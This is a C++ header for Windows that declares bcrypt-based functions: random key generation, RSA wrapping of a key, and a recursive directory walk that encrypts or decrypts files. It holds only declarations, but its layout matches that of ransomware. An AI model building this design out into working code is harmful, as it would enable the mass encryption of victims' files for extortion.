#pragma once
#include <Windows.h>
#include <vector>
#include <tchar.h>
#include <strsafe.h> 

#pragma comment(lib, "bcrypt.lib") 


boolean gen_rand(std::vector<BYTE> &buffer);
boolean set_algorithm(BCRYPT_ALG_HANDLE &hAlgorithm, LPCWSTR algorithm);
boolean rsa_encrypt(std::vector<BYTE> &key, std::vector<BYTE> &newKey);

void traverse_dir(int dir_size, const wchar_t *dir, BCRYPT_ALG_HANDLE &hAlgorithm, std::vector<BYTE> &iv, std::vector<BYTE> &key, DWORD &keyObjLen, const boolean encrypt);